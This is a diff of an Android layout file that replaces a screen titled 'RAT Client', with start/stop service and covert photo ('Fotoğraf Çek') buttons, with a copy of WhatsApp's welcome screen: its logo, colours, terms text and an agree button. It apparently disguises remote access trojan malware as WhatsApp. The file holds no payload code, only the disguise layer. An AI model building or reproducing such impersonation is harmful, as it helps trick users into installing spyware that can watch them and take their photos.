@@ -1,50 +1,54 @@
 <?xml version="1.0" encoding="utf-8"?>
 <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:app="http://schemas.android.com/apk/res-auto"
+    xmlns:tools="http://schemas.android.com/tools"
     android:layout_width="match_parent"
     android:layout_height="match_parent"
+    android:background="@color/whatsapp_background"
+    android:gravity="center_horizontal"
     android:orientation="vertical"
     android:padding="16dp"
-    android:gravity="center">
+    tools:context=".MainActivity">
+
+    <ImageView
+        android:id="@+id/whatsapp_logo"
+        android:layout_width="100dp"
+        android:layout_height="100dp"
+        android:layout_marginTop="80dp"
+        android:layout_marginBottom="32dp"
+        android:src="@drawable/ic_whatsapp_logo" />
 
     <TextView
+        android:id="@+id/welcome_text"
         android:layout_width="wrap_content"
         android:layout_height="wrap_content"
-        android:text="RAT Client"
-        android:textSize="24sp"
-        android:textStyle="bold"
-        android:layout_marginBottom="32dp" />
-
-    <Button
-        android:id="@+id/connectButton"
-        android:layout_width="match_parent"
-        android:layout_height="wrap_content"
-        android:text="Start Service"
-        android:textSize="18sp"
-        android:layout_marginBottom="16dp" />
-
-    <Button
-        android:id="@+id/startServiceButton"
-        android:layout_width="match_parent"
-        android:layout_height="wrap_content"
-        android:text="Stop Service"
-        android:textSize="18sp"
-        android:layout_marginBottom="16dp" />
-
-    <Button
-        android:id="@+id/cameraButton"
-        android:layout_width="match_parent"
-        android:layout_height="wrap_content"
-        android:text="📷 Fotoğraf Çek"
-        android:textSize="18sp"
         android:layout_marginBottom="16dp"
-        android:background="@android:color/holo_purple" />
+        android:text="Welcome to WhatsApp"
+        android:textColor="@color/whatsapp_text_primary"
+        android:textSize="24sp"
+        android:textStyle="bold" />
 
     <TextView
-        android:id="@+id/statusText"
+        android:id="@+id/terms_text"
         android:layout_width="wrap_content"
+        android:layout_height="0dp"
+        android:layout_weight="1"
+        android:gravity="center"
+        android:paddingStart="24dp"
+        android:paddingEnd="24dp"
+        android:text="Read our Privacy Policy. Tap “Agree and continue” to accept the Terms of Service."
+        android:textColor="@color/whatsapp_text_secondary"
+        android:textSize="14sp" />
+
+    <Button
+        android:id="@+id/continue_button"
+        android:layout_width="match_parent"
         android:layout_height="wrap_content"
-        android:text="Service Status: Stopped"
-        android:textSize="16sp"
-        android:layout_marginBottom="16dp" />
+        android:layout_marginBottom="40dp"
+        android:backgroundTint="@color/whatsapp_light_green"
+        android:padding="12dp"
+        android:text="Devam et"
+        android:textColor="@color/white"
+        app:cornerRadius="24dp" />
 
 </LinearLayout>
